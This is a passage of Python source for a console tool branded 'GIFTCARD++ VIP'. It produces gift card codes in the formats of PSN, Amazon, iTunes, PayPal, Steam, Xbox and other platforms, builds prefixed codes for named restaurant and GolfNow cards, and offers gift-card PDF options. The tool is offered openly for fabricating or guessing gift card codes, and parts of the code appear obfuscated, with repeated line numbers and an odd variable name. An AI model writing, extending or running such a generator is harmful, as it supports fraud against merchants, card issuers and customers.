        x16 = random.choice(possible_chars)  # line:1025
        dash4 = "-"  # line:1026
        x17 = random.choice(possible_chars)  # line:1027
        x18 = random.choice(possible_chars)  # line:1028
        x19 = random.choice(possible_chars)  # line:1029
        x20 = random.choice(possible_chars)  # line:1030
        newline = "\n"  # line:1031
        with open(f"generatedplaystore.txt", 'a')as f:  # line:1032
            f.write(
                x1 + x2 + x3 + x4 + dash1 + x5 + x6 + x7 + x8 + dash2 + x9 + x10 + x11 + x12 + dash3 + x13 + x14 + x15 + x16 + dash4 + x17 + x18 + x19 + x20 + newline)  # line:1033
def genxbox():  # line:1036
    possible_chars = 'ABCDEFGHJHIKLMNOPQRSTUVWXYZ0123456789'  # line:1037
    print(Fore.WHITE + "How Many Would You Like To Generate? ")  # line:1038
    amount_of_codes_input = input(Fore.BLUE + ">>")  # line:1004
    amount_of_codes = int(amount_of_codes_input)  # line:1005
    for _ in range(amount_of_codes):  # line:1006
        x1 = random.choice(possible_chars)  # line:1042
        x2 = random.choice(possible_chars)  # line:1043
        x3 = random.choice(possible_chars)  # line:1044
        x4 = random.choice(possible_chars)  # line:1045
        x5 = random.choice(possible_chars)  # line:1046
        dash1 = "-"  # line:1047
        x6 = random.choice(possible_chars)  # line:1048
        x7 = random.choice(possible_chars)  # line:1049
        x8 = random.choice(possible_chars)  # line:1050
        x9 = random.choice(possible_chars)  # line:1051
        x10 = random.choice(possible_chars)  # line:1052
        dash2 = "-"  # line:1053
        x11 = random.choice(possible_chars)  # line:1054
        x12 = random.choice(possible_chars)  # line:1055
        x13 = random.choice(possible_chars)  # line:1056
        x14 = random.choice(possible_chars)  # line:1057
        x15 = random.choice(possible_chars)  # line:1058
        dash3 = "-"  # line:1059
        x16 = random.choice(possible_chars)  # line:1060
        x17 = random.choice(possible_chars)  # line:1061
        x18 = random.choice(possible_chars)  # line:1062
        x19 = random.choice(possible_chars)  # line:1063
        x20 = random.choice(possible_chars)  # line:1064
        dash4 = "-"  # line:1065
        x21 = random.choice(possible_chars)  # line:1066
        x22 = random.choice(possible_chars)  # line:1067
        x23 = random.choice(possible_chars)  # line:1068
        x24 = random.choice(possible_chars)  # line:1069
        x25 = random.choice(possible_chars)  # line:1070
        newline = "\n"  # line:1071
        with open(f"generatedxbox.txt", 'a')as f:  # line:1072
            f.write(
                x1 + x2 + x3 + x4 + x5 + dash1 + x6 + x7 + x8 + x9 + x10 + dash2 + x11 + x12 + x13 + x14 + x15 + dash3 + x16 + x17 + x18 + x19 + x20 + dash4 + x21 + x22 + x23 + x24 + x25 + newline)  # line:1073
def gensteam():  # line:1076
    possible_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'  # line:1077
    print(Fore.WHITE + "How Many Would You Like To Generate? ")  # line:1078
    amount_of_threads_input = input(Fore.BLUE + ">>")  # line:1079
    amount_of_threads = int(amount_of_threads_input)  # line:1080
    for _ in range(amount_of_threads):  # line:1081
        x1 = random.choice(possible_chars)  # line:1082
        x2 = random.choice(possible_chars)  # line:1083
        x3 = random.choice(possible_chars)  # line:1084
        x4 = random.choice(possible_chars)  # line:1085
        dash1 = "-"  # line:1086
        x5 = random.choice(possible_chars)  # line:1087
        x6 = random.choice(possible_chars)  # line:1088
        x7 = random.choice(possible_chars)  # line:1089
        x8 = random.choice(possible_chars)  # line:1090
        x9 = random.choice(possible_chars)  # line:1091
        x10 = random.choice(possible_chars)  # line:1092
        dash2 = "-"  # line:1093
        x11 = random.choice(possible_chars)  # line:1094
        x12 = random.choice(possible_chars)  # line:1095
        x13 = random.choice(possible_chars)  # line:1096
        x14 = random.choice(possible_chars)  # line:1097
        x15 = random.choice(possible_chars)  # line:1098
        newline = "\n"  # line:1099
        with open(f"generatedsteam.txt", 'a')as f:  # line:1100
            f.write(
                x1 + x2 + x3 + x4 + dash1 + x5 + x6 + x7 + x8 + x9 + x10 + dash2 + x11 + x12 + x13 + x14 + x15 + newline)  # line:1101
def genpaypal():  # line:1104
    possible_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'  # line:1105
    print(Fore.WHITE + "How Many Would You Like To Generate? ")  # line:1106
    amount_of_threads_input = input(Fore.BLUE + ">>")  # line:1079
    amount_of_threads = int(amount_of_threads_input)  # line:1080
    for _ in range(amount_of_threads):  # line:1081
        x1 = random.choice(possible_chars)  # line:1110
        x2 = random.choice(possible_chars)  # line:1111
        x3 = random.choice(possible_chars)  # line:1112
        x4 = random.choice(possible_chars)  # line:1113
        dash1 = "-"  # line:1114
        x5 = random.choice(possible_chars)  # line:1115
        x6 = random.choice(possible_chars)  # line:1116
        x7 = random.choice(possible_chars)  # line:1117
        x8 = random.choice(possible_chars)  # line:1118
        dash2 = "-"  # line:1119
        x9 = random.choice(possible_chars)  # line:1120
        x10 = random.choice(possible_chars)  # line:1121
        x11 = random.choice(possible_chars)  # line:1122
        x12 = random.choice(possible_chars)  # line:1123
        newline = "\n"  # line:1124
        with open(f"generatedpaypal.txt", 'a')as f:  # line:1125
            f.write(
                x1 + x2 + x3 + x4 + dash1 + x5 + x6 + x7 + x8 + dash2 + x9 + x10 + x11 + x12 + newline)  # line:1126
def genitunes():  # line:1129
    possible_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'  # line:1130
    print(Fore.WHITE + "How Many Would You Like To Generate? ")  # line:1131
    amount_of_threads_input = input(Fore.BLUE + ">>")  # line:1079
    amount_of_threads = int(amount_of_threads_input)  # line:1080
    for _ in range(amount_of_threads):  # line:1081
        x1 = random.choice(possible_chars)  # line:1135
        x2 = random.choice(possible_chars)  # line:1136
        x3 = random.choice(possible_chars)  # line:1137
        x4 = random.choice(possible_chars)  # line:1138
        x5 = random.choice(possible_chars)  # line:1139
        x6 = random.choice(possible_chars)  # line:1140
        x7 = random.choice(possible_chars)  # line:1141
        x8 = random.choice(possible_chars)  # line:1142
        x9 = random.choice(possible_chars)  # line:1143
        x10 = random.choice(possible_chars)  # line:1144
        x11 = random.choice(possible_chars)  # line:1145
        x12 = random.choice(possible_chars)  # line:1146
        x13 = random.choice(possible_chars)  # line:1147
        x14 = random.choice(possible_chars)  # line:1148
        x15 = random.choice(possible_chars)  # line:1149
        x16 = random.choice(possible_chars)  # line:1150
        newline = "\n"  # line:1151
        with open(f"generateditunes.txt", 'a')as f:  # line:1152
            f.write(
                x1 + x2 + x3 + x4 + x5 + x6 + x7 + x8 + x9 + x10 + x11 + x12 + x13 + x14 + x15 + x16 + newline)  # line:1153
def genamazon():  # line:1156
    possible_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'  # line:1157
    print(Fore.WHITE + "How Many Would You Like To Generate? ")  # line:1158
    amount_of_threads_input = input(Fore.BLUE + ">>")  # line:1079
    amount_of_threads = int(amount_of_threads_input)  # line:1080
    for _ in range(amount_of_threads):  # line:1081
        x1 = random.choice(possible_chars)  # line:1162
        x2 = random.choice(possible_chars)  # line:1163
        x3 = random.choice(possible_chars)  # line:1164
        x4 = random.choice(possible_chars)  # line:1165
        dash1 = "-"  # line:1166
        x5 = random.choice(possible_chars)  # line:1167
        x6 = random.choice(possible_chars)  # line:1168
        x7 = random.choice(possible_chars)  # line:1169
        x8 = random.choice(possible_chars)  # line:1170
        x9 = random.choice(possible_chars)  # line:1171
        x10 = random.choice(possible_chars)  # line:1172
        dash2 = "-"  # line:1173
        x11 = random.choice(possible_chars)  # line:1174
        x12 = random.choice(possible_chars)  # line:1175
        x13 = random.choice(possible_chars)  # line:1176
        x14 = random.choice(possible_chars)  # line:1177
        newline = "\n"  # line:1178
        with open(f"generatedamazon.txt", 'a')as f:  # line:1179
            f.write(
                x1 + x2 + x3 + x4 + dash1 + x5 + x6 + x7 + x8 + x9 + x10 + dash2 + x11 + x12 + x13 + x14 + newline)  # line:1180
def genpsn():  # line:1183
    possible_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'  # line:1184
    print(Fore.WHITE + "How Many Would You Like To Generate? ")  # line:1185
    amount_of_threads_input = input(Fore.BLUE + ">>")  # line:1079
    amount_of_threads = int(amount_of_threads_input)  # line:1080
    for _ in range(amount_of_threads):  # line:1081
        x1 = random.choice(O00OO00O00OO00OO0)  # line:1189
        x2 = random.choice(O00OO00O00OO00OO0)  # line:1190
        x3 = random.choice(O00OO00O00OO00OO0)  # line:1191
        x4 = random.choice(O00OO00O00OO00OO0)  # line:1192
        dash1 = "-"  # line:1193
        x5 = random.choice(O00OO00O00OO00OO0)  # line:1194
        x6 = random.choice(O00OO00O00OO00OO0)  # line:1195
        x7 = random.choice(O00OO00O00OO00OO0)  # line:1196
        x8 = random.choice(O00OO00O00OO00OO0)  # line:1197
        dash2 = "-"  # line:1198
        x9 = random.choice(O00OO00O00OO00OO0)  # line:1199
        x10 = random.choice(O00OO00O00OO00OO0)  # line:1200
        x11 = random.choice(O00OO00O00OO00OO0)  # line:1201
        x12 = random.choice(O00OO00O00OO00OO0)  # line:1202
        newline = "\n"  # line:1203
        with open(f"generatedpsn.txt", 'a')as f:  # line:1204
            f.write(
                x1 + x2 + x3 + x4 + dash1 + x5 + x6 + x7 + x8 + dash2 + x9 + x10 + x11 + x12 + newline)  # line:1205
def eGIFT():  # line:1209
    os.system(f'cls & title [GIFTCARD++ VIP] By {me} ^| Version: {version}')  # line:1210
    print(f'''
\033[94m     _______________________________    ____  ____            \033[39m    
\033[94m    / ____/  _/ ____/_  __/ ____/   |  / __ \/ __ \  __    __ \033[39m    
\033[94m   / / __ / // /_    / / / /   / /| | / /_/ / / / /_/ /___/ /_\033[39m   
\033[94m  / /_/ // // __/   / / / /___/ ___ |/ _, _/ /_/ /_  __/_  __/\033[39m
\033[94m  \____/___/_/     /_/  \____/_/  |_/_/ |_/_____/ /_/   /_/   \033[39m
                            \033[94m V.I.P\033[39m
\033[90m[\033[90m\033[94m+\033[39m\033[90m]\033[0m GIFTCARD++ - #1 Giftcard AIO
\033[90m[\033[90m\033[94m1\033[39m\033[90m]\033[0m PSN
\033[90m[\033[90m\033[94m2\033[39m\033[90m]\033[0m Amazon Generator
\033[90m[\033[90m\033[94m3\033[39m\033[90m]\033[0m iTunes Generator
\033[90m[\033[90m\033[94m4\033[39m\033[90m]\033[0m Paypal Generator
\033[90m[\033[90m\033[94m5\033[39m\033[90m]\033[0m Steam Generator
\033[90m[\033[90m\033[94m6\033[39m\033[90m]\033[0m Xbox Generator
\033[90m[\033[90m\033[94m7\033[39m\033[90m]\033[0m PlayStore Generator
\033[90m[\033[90m\033[94m8\033[39m\033[90m]\033[0m Netflix Generator
\033[90m[\033[90m\033[31m0\033[31m\033[90m]\033[0m Back
''')  # line:1235
    choice = input('\033[94m>>\033[39m ')  # line:1237
    if choice == '1':  # line:1238
        genpsn()  # line:1239
        Generator()  # line:1240
    elif choice == '2':  # line:1241
        genamazon()  # line:1242
        Generator()  # line:1243
    elif choice == '3':  # line:1244
        genitunes()  # line:1245
        Generator()  # line:1246
    elif choice == '4':  # line:1247
        genpaypal()  # line:1248
        Generator()  # line:1249
    elif choice == '5':  # line:1250
        gensteam()  # line:1251
        Generator()  # line:1252
    elif choice == '6':  # line:1253
        genxbox()  # line:1254
        Generator()  # line:1255
    elif choice == '7':  # line:1256
        genplaystore()  # line:1257
        Generator()  # line:1258
    elif choice == '8':  # line:1259
        gennetflix()  # line:1260
        Generator()  # line:1261
    else:  # line:1262
        Generator()  # line:1263
def Generator():  # line:1275
    os.system(f'cls & title [GIFTCARD++ VIP] By {me} ^| Version: {version}')  # line:1276
    print(f'''
\033[94m     _______________________________    ____  ____            \033[39m    
\033[94m    / ____/  _/ ____/_  __/ ____/   |  / __ \/ __ \  __    __ \033[39m    
\033[94m   / / __ / // /_    / / / /   / /| | / /_/ / / / /_/ /___/ /_\033[39m   
\033[94m  / /_/ // // __/   / / / /___/ ___ |/ _, _/ /_/ /_  __/_  __/\033[39m
\033[94m  \____/___/_/     /_/  \____/_/  |_/_/ |_/_____/ /_/   /_/   \033[39m
                            \033[94m V.I.P\033[39m
\033[90m[\033[90m\033[94m+\033[39m\033[90m]\033[0m GIFTCARD++ - #1 Giftcard AIO
\033[90m[\033[90m\033[94m1\033[39m\033[90m]\033[0m Golfnow Generator
\033[90m[\033[90m\033[94m2\033[39m\033[90m]\033[0m Erberts & Gerberts Generator
\033[90m[\033[90m\033[94m3\033[39m\033[90m]\033[0m Fatz Generator
\033[90m[\033[90m\033[94m4\033[39m\033[90m]\033[0m Noodles & Company Generator
\033[90m[\033[90m\033[94m5\033[39m\033[90m]\033[0m Pop-Bar Generator
\033[90m[\033[90m\033[31m0\033[31m\033[90m]\033[0m Back
''')  # line:1298
    choice = input('\033[94m>>\033[39m ')  # line:1300
    if choice == '1':  # line:1301
        amount_of_threads_input = 1  # line:1302
        amount_of_threads = int(input(gen_num))  # line:1303
        with open(f'GolfNow Codes{unix}.txt', 'w')as f:  # line:1304
            while amount_of_threads_input <= amount_of_threads:  # line:1305
                f.write(f'6275717343{id(6, digits)}\n')  # line:1306
                amount_of_threads_input += 1  # line:1307
        Generator()  # line:1308
    elif choice == '3':  # line:1309
        amount_of_threads_input = 1  # line:1310
        amount_of_threads = int(input(gen_num))  # line:1311
        with open(f'Fatz Codes{unix}.txt', 'w')as f:  # line:1312
            while amount_of_threads_input <= amount_of_threads:  # line:1313
                f.write(f'11440000{id(3, digits)}\n')  # line:1314
                amount_of_threads_input += 1  # line:1315
        Generator()  # line:1316
    elif choice == '2':  # line:1317
        amount_of_threads_input = 1  # line:1318
        amount_of_threads = int(input(gen_num))  # line:1319
        with open(f'Erbert & Gerbert Codes{unix}.txt', 'w')as f:  # line:1320
            while amount_of_threads_input <= amount_of_threads:  # line:1321
                f.write(f'178050000{id(5, digits)}\n')  # line:1322
                amount_of_threads_input += 1  # line:1323
        Generator()  # line:1324
    elif choice == '4':  # line:1325
        amount_of_threads_input = 1  # line:1326
        amount_of_threads = int(input(gen_num))  # line:1327
        with open(f'Noodles & Company Codes{unix}.txt', 'w')as f:  # line:1328
            while amount_of_threads_input <= amount_of_threads:  # line:1329
                f.write(f'3200110000{id(4, digits)}\n')  # line:1330
                amount_of_threads_input += 1  # line:1331
        Generator()  # line:1332
    elif choice == '5':  # line:1333
        amount_of_threads_input = 1  # line:1334
        amount_of_threads = int(input(gen_num))  # line:1335
        with open(f'Pop-Bar Codes{unix}.txt', 'w')as f:  # line:1336
            while amount_of_threads_input <= amount_of_threads:  # line:1337
                f.write(f'60488716345031{id(3, digits)}\n')  # line:1338
                amount_of_threads_input += 1  # line:1339
        Generator()  # line:1340
    elif choice == '0':  # line:1342
        Menuu()  # line:1343
    else:  # line:1345
        print('[\033[31m!\033[0m] Invalid Option')  # line:1346
        time.sleep(2)  # line:1347
        Generator()  # line:1348
def PDF():  # line:1351
    os.system(f'cls & title [GIFTCARD++ VIP] By {me} ^| Version: {version}')  # line:1352
    print(f'''
\033[94m     _______________________________    ____  ____            \033[39m    
\033[94m    / ____/  _/ ____/_  __/ ____/   |  / __ \/ __ \  __    __ \033[39m    
\033[94m   / / __ / // /_    / / / /   / /| | / /_/ / / / /_/ /___/ /_\033[39m   
\033[94m  / /_/ // // __/   / / / /___/ ___ |/ _, _/ /_/ /_  __/_  __/\033[39m
\033[94m  \____/___/_/     /_/  \____/_/  |_/_/ |_/_____/ /_/   /_/   \033[39m
                            \033[94m V.I.P\033[39m
Applebee�s
\033[90m[\033[90m\033[94m+\033[39m\033[90m]\033[0m GIFTCARD++ - #1 Giftcard AIO
\033[90m[\033[90m\033[94m1\033[39m\033[90m]\033[0m Erberts & Gerberts PDF
\033[90m[\033[90m\033[94m2\033[39m\033[90m]\033[0m Noodles & Co PDF
\033[90m[\033[90m\033[94m3\033[39m\033[90m]\033[0m Applebee�s
\033[90m[\033[90m\033[94m4\033[39m\033[90m]\033[0m Aubree's Pizzeria and Grill
\033[90m[\033[90m\033[31m0\033[31m\033[90m]\033[0m Back
''')  # line:1373
    choice = input('\033[94m>>\033[39m ')  # line:1375
    if choice == '1':  # line:1376
        print('\nWrite In This Format: xxxxx xxxx xxxxx')  # line:1377
        erber()  # line:1378
    elif choice == '2':  # line:1380
        print('\nWrite In This Format: xxxxx xxxx xxxxx')  # line:1381
        noodle()  # line:1382
    elif choice == '3':  # line:1384
        print('\nWrite In This Format: xxxxxxxxxxxxxxxxxxx')  # line:1385
        apple12()  # line:1386
    elif choice == '4':  # line:1388
        print('\nWrite In This Format: xxxxx xxxx xxxxx')  # line:1389
        aurebees()  # line:1390
    elif choice == '0':  # line:1392
        Menuu()  # line:1393
if __name__ == "__main__":  # line:1396
    Menuu()  # line:1397